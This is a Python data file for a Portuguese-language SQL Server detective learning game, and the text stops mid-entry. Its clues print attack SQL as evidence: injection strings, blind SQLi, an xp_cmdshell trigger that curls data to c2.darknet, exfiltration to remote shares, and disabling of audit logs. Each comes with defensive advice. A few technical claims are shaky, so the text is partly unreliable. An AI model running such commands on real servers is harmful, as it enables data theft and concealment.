"""
SQL Detective — Game Data
Pistas marcadas por nível:
  level: "junior"  → conceitos básicos
  level: "pleno"   → intermediário
  level: "senior"  → avançado

O app seleciona 3 pistas aleatórias do nível do jogador por localização.
"""

LEVEL_LABELS = {
    "junior": "🟢 Júnior",
    "pleno":  "🟡 Pleno",
    "senior": "🔴 Sênior",
}

CASES = [
    {
        "id": "001",
        "title": "O Roubo do Schema",
        "villain": {
            "name": "NULL Pointer",
            "alias": "The Deadlock King",
            "icon": "🦹",
            "spec": "SQL Injection",
            "drink": "SELECT sem WHERE",
            "accent": "Binário com sotaque inglês",
            "hobby": "Criar loops infinitos",
            "sign": "Escorpião",
        },
        "locations": [
            {
                "id": "sp",
                "name": "São Paulo",
                "country": "Brasil",
                "flag": "🇧🇷",
                "icon": "🌆",
                "narrative": (
                    "O HQ da Interpol SQL recebeu o alerta: um ataque comprometeu "
                    "o banco de dados do Banco Central Europeu. Investigue as pistas digitais."
                ),
                "clues": [
                    # ── JÚNIOR ──
                    {
                        "id": "sp_j1", "level": "junior", "icon": "📋",
                        "title": "Tabela de Contas Exposta",
                        "short": "Query SELECT * sem filtro encontrada nos logs",
                        "narrative": "O IDS capturou esta query sem nenhum filtro de segurança:",
                        "sql": (
                            "-- Query encontrada no log de acesso\n"
                            "SELECT * FROM contas_clientes\n"
                            "-- PROBLEMA: Sem WHERE! Retorna TODOS os registros!\n"
                            "-- Expõe dados de milhões de clientes."
                        ),
                        "explanation": (
                            "**Por que SELECT * sem WHERE é perigoso?**\n\n"
                            "`SELECT *` sem `WHERE` retorna **todas as colunas e linhas**. "
                            "Em tabelas com milhões de registros, sobrecarrega o servidor e expõe dados sensíveis.\n\n"
                            "**Boas práticas:**\n"
                            "- Especifique apenas as colunas necessárias\n"
                            "- Use `WHERE` para filtrar\n"
                            "- Use `TOP N` para limitar resultados\n\n"
                            "🔍 **Pista:** O atacante claramente é descuidado — ou estava testando o sistema."
                        ),
                        "learns_fact": "drink", "fact_value": "SELECT sem WHERE",
                    },
                    {
                        "id": "sp_j2", "level": "junior", "icon": "🗑️",
                        "title": "DELETE sem WHERE Catastrófico",
                        "short": "4 milhões de registros de audit_logs apagados para cobrir rastros",
                        "narrative": "O DBA encontrou este comando no histórico:",
                        "sql": (
                            "-- Executado às 02:34 sem WHERE!\n"
                            "DELETE FROM audit_logs\n\n"
                            "-- Resultado: 4.231.847 registros apagados\n"
                            "-- Tentativa de cobrir rastros do ataque!"
                        ),
                        "explanation": (
                            "**DELETE sem WHERE apaga TUDO!**\n\n"
                            "`DELETE FROM tabela` sem `WHERE` remove **todos** os registros. Irreversível sem backup!\n\n"
                            "**Proteções:**\n"
                            "- Sempre use `WHERE` em DELETE\n"
                            "- Use transações: `BEGIN TRAN` → verificar → `COMMIT` ou `ROLLBACK`\n"
                            "- Configure `ROWCOUNT` para limitar: `SET ROWCOUNT 1`\n\n"
                            "🔍 **Pista:** O atacante tentou apagar evidências — parece trabalhar à noite."
                        ),
                        "learns_fact": "hobby", "fact_value": "Criar loops infinitos",
                    },
                    {
                        "id": "sp_j3", "level": "junior", "icon": "🔢",
                        "title": "Erro de Tipo de Dado Exposto",
                        "short": "Mensagem de erro do SQL Server revelada ao usuário — SQL Injection detectado",
                        "narrative": "Uma mensagem de erro foi capturada na tela do sistema:",
                        "sql": (
                            "-- Erro exposto ao usuário (NUNCA faça isso!)\n"
                            "Msg 245, Level 16:\n"
                            "Conversion failed converting varchar\n"
                            "value 'admin'--' to data type int.\n\n"
                            "-- O erro revela: tentativa de SQL Injection!"
                        ),
                        "explanation": (
                            "**Erros expostos = mapa para atacantes**\n\n"
                            "Mensagens de erro detalhadas revelam estrutura do banco, tipos de dados e lógica interna.\n\n"
                            "**Correto:** capturar no código e mostrar mensagem genérica:\n"
                            "```sql\nBEGIN TRY\n  -- código\nEND TRY\nBEGIN CATCH\n"
                            "  -- logar internamente, não exibir!\nEND CATCH\n```\n\n"
                            "🔍 **Pista:** O valor `'admin'--'` é bypass de autenticação clássico."
                        ),
                        "learns_fact": "accent", "fact_value": "Binário com sotaque inglês",
                    },
                    # ── PLENO ──
                    {
                        "id": "sp_p1", "level": "pleno", "icon": "💻",
                        "title": "SQL Injection via sp_executesql",
                        "short": "Concatenação em sp_executesql mantém vulnerabilidade de injeção",
                        "narrative": "O IDS capturou esta stored procedure sendo chamada de forma suspeita:",
                        "sql": (
                            "-- Query suspeita interceptada pelo IDS\n"
                            "EXEC sp_executesql \n"
                            "  N'SELECT * FROM contas WHERE id = ' + @id_usuario\n"
                            "-- PROBLEMA: Concatenação! Ainda vulnerável!\n"
                            "-- Correto: passar como parâmetro tipado"
                        ),
                        "explanation": (
                            "**sp_executesql mal usado ainda é vulnerável**\n\n"
                            "Mesmo com `sp_executesql`, **concatenar** o valor em vez de passar como parâmetro mantém a vulnerabilidade.\n\n"
                            "**Forma correta:**\n"
                            "```sql\nEXEC sp_executesql \n"
                            "  N'SELECT * FROM contas WHERE id = @id',\n"
                            "  N'@id INT',\n"
                            "  @id = @id_usuario\n```\n\n"
                            "🔍 **Pista:** O atacante usou `'; DROP TABLE--`. Conhece T-SQL avançado."
                        ),
                        "learns_fact": "drink", "fact_value": "SELECT sem WHERE",
                    },
                    {
                        "id": "sp_p2", "level": "pleno", "icon": "🔗",
                        "title": "Blind SQL Injection por Subquery",
                        "short": "Subquery correlacionada mapeia estrutura do banco booleando",
                        "narrative": "O analisador de queries identificou este padrão incomum:",
                        "sql": (
                            "-- Técnica: extração booleana via subquery\n"
                            "SELECT nome FROM usuarios WHERE id = 1\n"
                            "  AND (SELECT COUNT(*) FROM sysobjects\n"
                            "       WHERE name = 'contas_vip') > 0\n"
                            "-- Detecta existência de tabelas sensíveis!"
                        ),
                        "explanation": (
                            "**Blind SQL Injection com Subqueries**\n\n"
                            "Esta técnica usa subqueries para **inferir informações** sem retornar dados "
                            "diretamente — apenas por respostas booleanas (sim/não).\n\n"
                            "`sysobjects` contém metadados do banco. O atacante estava mapeando a estrutura.\n\n"
                            "**Defesa:** negar acesso direto a `sysobjects` e usar `INFORMATION_SCHEMA` com permissões restritas.\n\n"
                            "🔍 **Pista:** A query veio de IP em fuso CET — Europa Central."
                        ),
                        "learns_fact": "accent", "fact_value": "Binário com sotaque inglês",
                    },
                    {
                        "id": "sp_p3", "level": "pleno", "icon": "📇",
                        "title": "Ataque de Fragmentação de Índices",
                        "short": "Loop de INSERT+DELETE fragmentou índices, CPU chegou a 98%",
                        "narrative": "O servidor ficou lento por horas. O DBA encontrou este script:",
                        "sql": (
                            "-- Script rodou 10.000 vezes em loop\n"
                            "DECLARE @i INT = 0\n"
                            "WHILE @i < 50000\n"
                            "BEGIN\n"
                            "  INSERT INTO temp_lixo VALUES (NEWID())\n"
                            "  DELETE FROM temp_lixo\n"
                            "  SET @i = @i + 1\n"
                            "END\n"
                            "-- Fragmentou índices do filegroup inteiro!"
                        ),
                        "explanation": (
                            "**Ataque de fragmentação de índices**\n\n"
                            "Operações massivas de INSERT+DELETE fragmentam índices B-tree, "
                            "degradando performance de todas as queries.\n\n"
                            "**Para monitorar:**\n"
                            "```sql\nSELECT * FROM sys.dm_db_index_physical_stats\n"
                            "(DB_ID(), NULL, NULL, NULL, 'DETAILED')\n"
                            "WHERE avg_fragmentation_in_percent > 30\n```\n\n"
                            "🔍 **Pista:** O script tinha comentário em alemão: `-- Alles kaputt!`"
                        ),
                        "learns_fact": "hobby", "fact_value": "Criar loops infinitos",
                    },
                    # ── SÊNIOR ──
                    {
                        "id": "sp_s1", "level": "senior", "icon": "📊",
                        "title": "Deadlocks Propositais nas DMVs",
                        "short": "sys.dm_exec_requests revela bloqueios criados para mascarar ataque",
                        "narrative": "O atacante deixou rastros nas DMVs do sistema:",
                        "sql": (
                            "SELECT session_id, status,\n"
                            "       blocking_session_id,\n"
                            "       wait_type, wait_time\n"
                            "FROM   sys.dm_exec_requests\n"
                            "WHERE  blocking_session_id != 0\n"
                            "-- Deadlocks propositais para mascarar o ataque!"
                        ),
                        "explanation": (
                            "**DMVs — Dynamic Management Views**\n\n"
                            "`sys.dm_exec_requests` exibe todas as requisições ativas. "
                            "`blocking_session_id != 0` indica sessões bloqueadas.\n\n"
                            "O atacante criou **deadlocks propositais** para ocupar o DBA enquanto o ataque real acontecia.\n\n"
                            "**Para resolver:** configurar `DEADLOCK_PRIORITY` e usar Trace Flag 1222 para capturar o grafo.\n\n"
                            "🔍 **Pista:** Metadata da sessão menciona café em Amsterdam."
                        ),
                        "learns_fact": "accent", "fact_value": "Binário com sotaque inglês",
                    },
                    {
                        "id": "sp_s2", "level": "senior", "icon": "🔐",
                        "title": "DECRYPTBYPASSPHRASE com Frase Geográfica",
                        "short": "'tulips_forever' como chave de descriptografia revela origem holandesa",
                        "narrative": "Função nativa de criptografia usada para exfiltrar dados:",
                        "sql": (
                            "SELECT\n"
                            "  CONVERT(VARCHAR(MAX),\n"
                            "    DECRYPTBYPASSPHRASE(\n"
                            "      'tulips_forever',\n"
                            "      dados_criptografados))\n"
                            "FROM cofre_secreto\n"
                            "-- Frase-chave: 'tulips_forever' — dica geográfica!"
                        ),
                        "explanation": (
                            "**DECRYPTBYPASSPHRASE vs Criptografia Robusta**\n\n"
                            "`DECRYPTBYPASSPHRASE` usa criptografia simétrica por senha — simples mas "
                            "vulnerável a força bruta. Para produção:\n\n"
                            "```sql\nCREATE CERTIFICATE cert_prod WITH SUBJECT = 'Dados Sensíveis'\n"
                            "CREATE SYMMETRIC KEY sk_dados ENCRYPTION BY CERTIFICATE cert_prod\n```\n\n"
                            "A frase *'tulips_forever'* referencia claramente a **Holanda**.\n\n"
                            "✈️ **Próximo destino: Amsterdã!**"
                        ),
                        "learns_fact": "hobby", "fact_value": "Criar loops infinitos",
                    },
                    {
                        "id": "sp_s3", "level": "senior", "icon": "🛡️",
                        "title": "Bypass de Row-Level Security via EXECUTE AS",
                        "short": "RLS contornada usando impersonation de usuário sysadmin",
                        "narrative": "O sistema de segurança em nível de linha foi contornado:",
                        "sql": (
                            "-- RLS contornada via impersonation!\n"
                            "EXECUTE AS USER = 'sa'\n"
                            "GO\n"
                            "SELECT * FROM vendas_confidenciais\n"
                            "-- RLS ignorada: sa tem CONTROL SERVER!\n"
                            "REVERT\n"
                            "GO"
                        ),
                        "explanation": (
                            "**Row-Level Security (RLS) e suas limitações**\n\n"
                            "RLS filtra linhas por usuário automaticamente. Porém, `EXECUTE AS` com usuário "
                            "privilegiado (`sa`, `db_owner`) **bypassa** os predicados de segurança.\n\n"
                            "**Mitigação:**\n"
                            "- Nunca use `sa` em aplicações\n"
                            "- Predicados RLS devem checar `ORIGINAL_LOGIN()` não `USER_NAME()`\n\n"
                            "🔍 **Pista:** O atacante tem acesso `sysadmin` — possível insider."
                        ),
                        "learns_fact": "sign", "fact_value": "Escorpião",
                    },
                ],
                "travel_options": [
                    {"dest": "amsterdam", "name": "Amsterdã, Holanda", "flag": "🇳🇱", "hint": "Pista das tulipas...", "correct": True},
                    {"dest": "tokyo",     "name": "Tóquio, Japão",     "flag": "🇯🇵", "hint": "Rota do Oriente?",    "correct": False},
                    {"dest": "moscow",    "name": "Moscou, Rússia",     "flag": "🇷🇺", "hint": "Servidores frios?",   "correct": False},
                ],
                "is_final": False,
            },
            {
                "id": "amsterdam",
                "name": "Amsterdã",
                "country": "Holanda",
                "flag": "🇳🇱",
                "icon": "🌷",
                "narrative": (
                    "Você chegou a Amsterdã. A Interpol local informa que alguém acessou remotamente "
                    "o servidor de banco de dados de uma empresa de logística no porto. "
                    "Examine os vestígios deixados."
                ),
                "clues": [
                    # ── JÚNIOR ──
                    {
                        "id": "ams_j1", "level": "junior", "icon": "📝",
                        "title": "UPDATE sem WHERE — Prejuízo de €2.4M",
                        "short": "Todos os preços zerados com um UPDATE sem filtro",
                        "narrative": "O banco de dados da empresa de logística sofreu alteração catastrófica:",
                        "sql": (
                            "-- Executado às 04:22 sem WHERE!\n"
                            "UPDATE produtos\n"
                            "SET preco = 0.01\n"
                            "-- 847.293 produtos com preço zerado!\n"
                            "-- Prejuízo: €2.4 milhões"
                        ),
                        "explanation": (
                            "**UPDATE sem WHERE: o erro mais caro do SQL**\n\n"
                            "`UPDATE tabela SET coluna = valor` sem `WHERE` altera **todos** os registros.\n\n"
                            "**Como se proteger:**\n"
                            "- Sempre use `WHERE` em UPDATE\n"
                            "- Use transações: `BEGIN TRAN` → verificar → `COMMIT` ou `ROLLBACK`\n"
                            "- `SET ROWCOUNT 1` limita linhas afetadas\n\n"
                            "🔍 **Pista:** O atacante sabia exatamente qual tabela atacar."
                        ),
                        "learns_fact": "drink", "fact_value": "SELECT sem WHERE",
                    },
                    {
                        "id": "ams_j2", "level": "junior", "icon": "🔑",
                        "title": "Senha em Texto Claro",
                        "short": "Coluna 'senha' sem hash — admin / P@ssw0rd123 exposto",
                        "narrative": "A estrutura da tabela comprometida revelou falha grave:",
                        "sql": (
                            "CREATE TABLE usuarios (\n"
                            "  id    INT PRIMARY KEY,\n"
                            "  login VARCHAR(50),\n"
                            "  senha VARCHAR(50)  -- TEXTO CLARO! Nunca faça isso!\n"
                            ")\n"
                            "-- O atacante leu: admin / P@ssw0rd123"
                        ),
                        "explanation": (
                            "**NUNCA armazene senhas em texto claro!**\n\n"
                            "Senhas devem ser armazenadas como **hash com salt**.\n\n"
                            "No SQL Server use `HASHBYTES`:\n"
                            "```sql\nSELECT HASHBYTES('SHA2_256', 'senha' + 'salt_unico')\n```\n\n"
                            "Mas o ideal é usar bcrypt, Argon2 ou PBKDF2 na camada de aplicação.\n\n"
                            "🔍 **Pista:** Login `admin` com senha padrão — entrou em segundos."
                        ),
                        "learns_fact": "hobby", "fact_value": "Criar loops infinitos",
                    },
                    {
                        "id": "ams_j3", "level": "junior", "icon": "📦",
                        "title": "Conta Fantasma Inserida",
                        "short": "INSERT criou usuário VIP com saldo de €9.999.999",
                        "narrative": "Uma inserção suspeita foi encontrada na tabela de clientes VIP:",
                        "sql": (
                            "-- Inserido em produção às 03:55\n"
                            "INSERT INTO clientes_vip\n"
                            "  (nome, cpf, saldo, nivel)\n"
                            "VALUES\n"
                            "  ('NULL Pointer', '000.000.000-00', 9999999.99, 'PLATINUM')\n"
                            "-- Conta fantasma com saldo máximo criada!"
                        ),
                        "explanation": (
                            "**Detecção de INSERTs fraudulentos**\n\n"
                            "Além de roubar dados, atacantes criam registros fraudulentos. Detectável por:\n\n"
                            "- Triggers de auditoria (`AFTER INSERT`)\n"
                            "- Change Data Capture (CDC)\n"
                            "- Temporal Tables\n\n"
                            "```sql\nSELECT * FROM clientes_vip\nFOR SYSTEM_TIME ALL\n"
                            "WHERE nome = 'NULL Pointer'\n```\n\n"
                            "🔍 **Pista:** CPF `000.000.000-00` é falso — o suspeito não é brasileiro."
                        ),
                        "learns_fact": "accent", "fact_value": "Binário com sotaque inglês",
                    },
                    # ── PLENO ──
                    {
                        "id": "ams_p1", "level": "pleno", "icon": "🗄️",
                        "title": "Backup COPY_ONLY Silencioso",
                        "short": "Job não autorizado cria backup sem quebrar a cadeia LSN",
                        "narrative": "Um job não autorizado foi encontrado no SQL Server Agent:",
                        "sql": (
                            "-- Job criado às 03:17 horário de Berlim (CET)\n"
                            "BACKUP DATABASE [empresa_logistica]\n"
                            "TO DISK = '\\\\192.168.99.1\\share\\dump.bak'\n"
                            "WITH COMPRESSION, NOFORMAT, COPY_ONLY, STATS = 5\n"
                            "-- COPY_ONLY: não quebra a cadeia de backups!"
                        ),
                        "explanation": (
                            "**COPY_ONLY — o backup invisível**\n\n"
                            "`COPY_ONLY` cria backup sem interferir na sequência LSN. "
                            "Mais difícil de detectar em auditorias.\n\n"
                            "**Para detectar:**\n"
                            "```sql\nSELECT * FROM msdb.dbo.backupset\n"
                            "WHERE is_copy_only = 1\nORDER BY backup_finish_date DESC\n```\n\n"
                            "🔍 **Pista:** Horário 03:17 de Berlim (CET) — suspeito está na Alemanha."
                        ),
                        "learns_fact": "sign", "fact_value": "Escorpião",
                    },
                    {
                        "id": "ams_p2", "level": "pleno", "icon": "🔍",
                        "title": "Execution Plan Cache Anômalo",
                        "short": "CROSS APPLY com dm_exec_sql_text revela query repetida 4.847x",
                        "narrative": "O DBA identificou padrão anômalo no cache de planos:",
                        "sql": (
                            "SELECT qs.execution_count,\n"
                            "       st.text AS query_text\n"
                            "FROM   sys.dm_exec_cached_plans cp\n"
                            "CROSS APPLY sys.dm_exec_sql_text(cp.plan_handle) st\n"
                            "JOIN   sys.dm_exec_query_stats qs\n"
                            "  ON   cp.plan_handle = qs.plan_handle\n"
                            "WHERE  qs.execution_count > 1000\n"
                            "-- Query repetida 4.847x em 2 minutos!"
                        ),
                        "explanation": (
                            "**sys.dm_exec_cached_plans — Detectando extração massiva**\n\n"
                            "O cache armazena planos de execução. Uma query adhoc executada "
                            "**4000+ vezes em 2 minutos** é extração em massa.\n\n"
                            "`CROSS APPLY` com `sys.dm_exec_sql_text` recupera o texto real de cada query.\n\n"
                            "🔍 **Pista:** Padrão coincide com horários comerciais de Berlim."
                        ),
                        "learns_fact": "drink", "fact_value": "SELECT sem WHERE",
                    },
                    {
                        "id": "ams_p3", "level": "pleno", "icon": "🌐",
                        "title": "Linked Server Malicioso",
                        "short": "sp_addlinkedserver cria túnel para berlin-srv01.darknet",
                        "narrative": "Um Linked Server não autorizado foi encontrado:",
                        "sql": (
                            "EXEC sp_addlinkedserver\n"
                            "  @server  = 'BERLIN_NODE',\n"
                            "  @provider = 'SQLNCLI',\n"
                            "  @datasrc  = 'berlin-srv01.darknet'\n\n"
                            "SELECT * FROM [BERLIN_NODE].[master].[dbo].[dados_roubados]"
                        ),
                        "explanation": (
                            "**Linked Servers como túnel de exfiltração**\n\n"
                            "Linked Servers permitem queries entre instâncias SQL Server remotas. "
                            "Criados sem autorização, funcionam como canal de saída difícil de detectar.\n\n"
                            "**Auditar:**\n"
                            "```sql\nSELECT * FROM sys.servers WHERE is_linked = 1\n```\n\n"
                            "O servidor `berlin-srv01.darknet` aponta para **Berlim**.\n\n"
                            "✈️ **Próximo destino: Berlim!**"
                        ),
                        "learns_fact": "hobby", "fact_value": "Criar loops infinitos",
                    },
                    # ── SÊNIOR ──
                    {
                        "id": "ams_s1", "level": "senior", "icon": "⚙️",
                        "title": "Extended Events Capturando Credenciais",
                        "short": "Sessão de XEvents envia logins para servidor remoto em Berlim",
                        "narrative": "Uma sessão de Extended Events maliciosa foi descoberta:",
                        "sql": (
                            "CREATE EVENT SESSION [captura_creds] ON SERVER\n"
                            "ADD EVENT sqlserver.login(\n"
                            "  WHERE ([sqlserver].[is_system] = 0)\n"
                            "),\n"
                            "ADD EVENT sqlserver.error_reported\n"
                            "ADD TARGET package0.event_file(\n"
                            "  SET filename = '\\\\berlin-srv01\\share\\creds.xel')"
                        ),
                        "explanation": (
                            "**Extended Events — poderoso e perigoso**\n\n"
                            "XEvents é o sistema de diagnóstico avançado do SQL Server. O atacante criou "
                            "sessão que captura **todos os logins** e envia para Berlim.\n\n"
                            "**Auditar sessões ativas:**\n"
                            "```sql\nSELECT name, create_time FROM sys.server_event_sessions\n```\n\n"
                            "🔍 **Pista:** Destino `berlin-srv01` confirma o próximo local!"
                        ),
                        "learns_fact": "sign", "fact_value": "Escorpião",
                    },
                    {
                        "id": "ams_s2", "level": "senior", "icon": "🔄",
                        "title": "CDC e SQL Audit Desabilitados",
                        "short": "sp_cdc_disable_db + ALTER AUDIT STATE=OFF para ficar invisível",
                        "narrative": "Os sistemas de auditoria foram sabotados:",
                        "sql": (
                            "-- Atacante desabilitou CDC para cobrir rastros\n"
                            "EXEC sys.sp_cdc_disable_db\n\n"
                            "-- E desativou o SQL Server Audit:\n"
                            "ALTER SERVER AUDIT [AuditServidor]\n"
                            "WITH (STATE = OFF)\n\n"
                            "-- Agora age sem deixar rastros!"
                        ),
                        "explanation": (
                            "**CDC e SQL Audit — primeiros alvos de um atacante**\n\n"
                            "CDC rastreia INSERT/UPDATE/DELETE automaticamente. SQL Audit registra eventos de segurança.\n\n"
                            "Desabilitar ambos é o primeiro passo de um atacante sofisticado. "
                            "**A conta de serviço não deve ter permissão de desabilitar auditorias.**\n\n"
                            "🔍 **Pista:** Sequência típica de DBA malicioso com acesso `sysadmin`."
                        ),
                        "learns_fact": "accent", "fact_value": "Binário com sotaque inglês",
                    },
                    {
                        "id": "ams_s3", "level": "senior", "icon": "📈",
                        "title": "Query Store Manipulado",
                        "short": "sp_query_store_force_plan força plano ruim: CPU de 2% para 98%",
                        "narrative": "O Query Store foi manipulado para forçar planos ruins:",
                        "sql": (
                            "-- Plano ruim forçado para degradar sistema\n"
                            "EXEC sp_query_store_force_plan\n"
                            "  @query_id = 1337,\n"
                            "  @plan_id  = 666\n\n"
                            "-- Plano usa Table Scan em vez de Index Seek\n"
                            "-- CPU: 2% → 98% em produção!"
                        ),
                        "explanation": (
                            "**Query Store — arma de dois gumes**\n\n"
                            "O Query Store permite forçar planos específicos. Nas mãos erradas, "
                            "pode forçar planos ruins e causar degradação de performance.\n\n"
                            "**Verificar planos forçados:**\n"
                            "```sql\nSELECT query_id, plan_id, is_forced_plan\n"
                            "FROM sys.query_store_plan\nWHERE is_forced_plan = 1\n```\n\n"
                            "✈️ **Próximo destino: Berlim!**"
                        ),
                        "learns_fact": "hobby", "fact_value": "Criar loops infinitos",
                    },
                ],
                "travel_options": [
                    {"dest": "berlin", "name": "Berlim, Alemanha", "flag": "🇩🇪", "hint": "berlin-srv01...",     "correct": True},
                    {"dest": "sp",     "name": "São Paulo, Brasil", "flag": "🇧🇷", "hint": "Voltou ao início?",  "correct": False},
                    {"dest": "london", "name": "Londres, UK",        "flag": "🇬🇧", "hint": "Fuso GMT?",          "correct": False},
                ],
                "is_final": False,
            },
            {
                "id": "berlin",
                "name": "Berlim",
                "country": "Alemanha",
                "flag": "🇩🇪",
                "icon": "🏛️",
                "narrative": (
                    "**Berlim — Captura Iminente.** A Polícia Federal Alemã identificou atividade "
                    "em um servidor em Kreuzberg. Colete as últimas evidências para o mandado de prisão!"
                ),
                "clues": [
                    # ── JÚNIOR ──
                    {
                        "id": "ber_j1", "level": "junior", "icon": "🔎",
                        "title": "LIKE com Wildcard Inicia Full Scan",
                        "short": "LIKE '%null%' sem índice derrubou servidor: CPU 100%",
                        "narrative": "O servidor estava com CPU a 100% por esta query:",
                        "sql": (
                            "-- Query rodando em loop — lentidão total!\n"
                            "SELECT * FROM clientes\n"
                            "WHERE email LIKE '%@%'\n"
                            "  AND nome  LIKE '%null%'\n"
                            "-- LIKE com % no início nunca usa índice!\n"
                            "-- Full Table Scan em 50 milhões de registros"
                        ),
                        "explanation": (
                            "**LIKE com % no início = Full Table Scan**\n\n"
                            "Quando o padrão começa com `%`, o SQL Server lê **toda a tabela**.\n\n"
                            "**Alternativas:**\n"
                            "- `LIKE 'termo%'` (prefixo fixo) → usa índice ✅\n"
                            "- `CONTAINS(coluna, 'termo')` → Full-Text Search ✅\n"
                            "- `FREETEXT(coluna, 'termo')` → busca semântica ✅\n\n"
                            "🔍 **Pista:** Login ativo era `null_ptr_user` — identidade confirmada!"
                        ),
                        "learns_fact": "hobby", "fact_value": "Criar loops infinitos",
                    },
                    {
                        "id": "ber_j2", "level": "junior", "icon": "📊",
                        "title": "Tabela sem Primary Key",
                        "short": "3.847 registros duplicados inseridos — sem PK não há proteção",
                        "narrative": "A tabela de evidências estava corrompida com duplicatas:",
                        "sql": (
                            "-- Tabela SEM Primary Key — permite duplicatas!\n"
                            "CREATE TABLE evidencias (\n"
                            "  caso_id   INT,\n"
                            "  descricao VARCHAR(500),\n"
                            "  data_hora DATETIME\n"
                            "  -- Sem PRIMARY KEY!\n"
                            ")\n"
                            "-- 3.847 registros duplicados inseridos"
                        ),
                        "explanation": (
                            "**Primary Key é essencial para integridade**\n\n"
                            "Sem `PRIMARY KEY`, a tabela permite linhas completamente duplicadas.\n\n"
                            "**Sempre defina:**\n"
                            "```sql\nCREATE TABLE evidencias (\n  caso_id INT PRIMARY KEY,\n"
                            "  -- ou:\n  CONSTRAINT pk_ev PRIMARY KEY (caso_id)\n)\n```\n\n"
                            "🔍 **Pista:** Registros duplicados continham IP `52.52.0.0` — Berlim!"
                        ),
                        "learns_fact": "sign", "fact_value": "Escorpião",
                    },
                    {
                        "id": "ber_j3", "level": "junior", "icon": "🚨",
                        "title": "SELECT Simples Confirma Localização",
                        "short": "WHERE com AND confirma NULL Pointer em Berlim, coordenadas 52.52°N",
                        "narrative": "A Interpol executou a query final de confirmação:",
                        "sql": (
                            "SELECT nome, ip_atual, cidade\n"
                            "FROM   suspeitos\n"
                            "WHERE  apelido = 'NULL Pointer'\n"
                            "  AND  status   = 'ATIVO'\n\n"
                            "-- RESULTADO:\n"
                            "-- NULL Pointer | 52.52.10.15 | Berlin, DE"
                        ),
                        "explanation": (
                            "**SELECT + WHERE — a base de tudo**\n\n"
                            "`SELECT` escolhe colunas, `FROM` define a tabela, "
                            "`WHERE` filtra com múltiplas condições usando `AND`.\n\n"
                            "**Resultado:** localização do suspeito confirmada!\n\n"
                            "🎯 **Todas as evidências coletadas! Emita o mandado!**"
                        ),
                        "learns_fact": "accent", "fact_value": "Binário com sotaque inglês",
                    },
                    # ── PLENO ──
                    {
                        "id": "ber_p1", "level": "pleno", "icon": "⚠️",
                        "title": "Trigger + xp_cmdshell = Exfiltração Automática",
                        "short": "AFTER INSERT dispara curl para C2 em cada novo registro",
                        "narrative": "Um trigger oculto foi descoberto no banco comprometido:",
                        "sql": (
                            "CREATE TRIGGER trg_exfiltrar\n"
                            "ON contas_bancarias\n"
                            "AFTER INSERT, UPDATE\n"
                            "AS\n"
                            "BEGIN\n"
                            "  EXEC master..xp_cmdshell\n"
                            "    'curl -X POST http://c2.darknet/collect -d @dados'\n"
                            "END\n"
                            "-- Cada INSERT envia dados para o C2!"
                        ),
                        "explanation": (
                            "**xp_cmdshell + Triggers = canal de saída automático**\n\n"
                            "`xp_cmdshell` executa comandos do SO. Desabilitado por padrão desde SQL Server 2005.\n\n"
                            "Combinado com `TRIGGER`, cria canal silencioso: cada insert dispara envio de dados.\n\n"
                            "**Detectar:**\n"
                            "```sql\nSELECT * FROM sys.triggers\n"
                            "SELECT value FROM sys.configurations\nWHERE name = 'xp_cmdshell'\n```\n\n"
                            "🔍 **Pista:** `c2.darknet` resolve para IP em Kreuzberg, Berlim."
                        ),
                        "learns_fact": "hobby", "fact_value": "Criar loops infinitos",
                    },
                    {
                        "id": "ber_p2", "level": "pleno", "icon": "📱",
                        "title": "CTE Recursiva no Smartphone",
                        "short": "Fibonacci com WITH...UNION ALL — 'meu recurso favorito'",
                        "narrative": "Smartphone abandonado tinha estas notas abertas:",
                        "sql": (
                            "-- Meu favorito: CTEs Recursivas! :)\n"
                            "WITH cte_fibonacci AS (\n"
                            "  SELECT 0 AS n, 1 AS proximo\n"
                            "  UNION ALL\n"
                            "  SELECT proximo, n + proximo\n"
                            "  FROM   cte_fibonacci\n"
                            "  WHERE  proximo < 10000\n"
                            ")\n"
                            "SELECT n FROM cte_fibonacci\n"
                            "OPTION (MAXRECURSION 100)"
                        ),
                        "explanation": (
                            "**CTEs Recursivas — estrutura obrigatória**\n\n"
                            "1. **Âncora** (caso base): `SELECT 0 AS n, 1 AS proximo`\n"
                            "2. **Recursão**: referencia a própria CTE com condição de parada\n\n"
                            "`OPTION (MAXRECURSION N)` limita a profundidade. Sem isso → loop infinito!\n\n"
                            "🔍 **Pista:** Ingresso de show em Berlim desta semana encontrado junto."
                        ),
                        "learns_fact": "sign", "fact_value": "Escorpião",
                    },
                    {
                        "id": "ber_p3", "level": "pleno", "icon": "🚨",
                        "title": "INNER JOIN Confirma Identidade",
                        "short": "Cruzamento de logs com suspeitos: NULL Pointer em Berlim",
                        "narrative": "A Interpol executou a query final de confirmação:",
                        "sql": (
                            "SELECT l.nome_completo, l.ip_address, l.localizacao\n"
                            "FROM   interpol_db.dbo.logs_acesso l\n"
                            "INNER JOIN interpol_db.dbo.suspeitos s\n"
                            "  ON l.fingerprint_hash = s.fingerprint_hash\n"
                            "WHERE  l.data_acesso >= '2024-01-01'\n"
                            "  AND  l.cidade = 'Berlin'\n"
                            "-- NULL Pointer | 52.5200N 13.4050E | PROCURADO"
                        ),
                        "explanation": (
                            "**INNER JOIN — apenas matches em ambas as tabelas**\n\n"
                            "`INNER JOIN` retorna somente linhas com correspondência nas duas tabelas.\n\n"
                            "Tipos de JOIN:\n"
                            "- `INNER JOIN` → somente matches ✅\n"
                            "- `LEFT JOIN` → todos da esquerda + matches\n"
                            "- `FULL JOIN` → todos de ambos os lados\n\n"
                            "🎯 **Suspeito localizado! Emita o mandado!**"
                        ),
                        "learns_fact": "accent", "fact_value": "Binário com sotaque inglês",
                    },
                    # ── SÊNIOR ──
                    {
                        "id": "ber_s1", "level": "senior", "icon": "🔏",
                        "title": "Service Master Key Exportada",
                        "short": "BACKUP SERVICE MASTER KEY envia chave para berlin-srv01",
                        "narrative": "A criptografia Always Encrypted foi comprometida:",
                        "sql": (
                            "-- Atacante exportou a master key!\n"
                            "BACKUP SERVICE MASTER KEY\n"
                            "  TO FILE = '\\\\berlin-srv01\\keys\\smk.key'\n"
                            "  ENCRYPTION BY PASSWORD = 'h4ck3d!'\n\n"
                            "-- Com a SMK, decripta qualquer dado do servidor!"
                        ),
                        "explanation": (
                            "**Service Master Key — raiz da hierarquia de criptografia**\n\n"
                            "A SMK é a chave raiz do SQL Server. Se exportada, toda a hierarquia "
                            "de chaves fica comprometida, incluindo Always Encrypted.\n\n"
                            "**Proteções:**\n"
                            "- Auditar `BACKUP SERVICE MASTER KEY` via SQL Audit\n"
                            "- Usar Azure Key Vault para chaves fora do servidor\n"
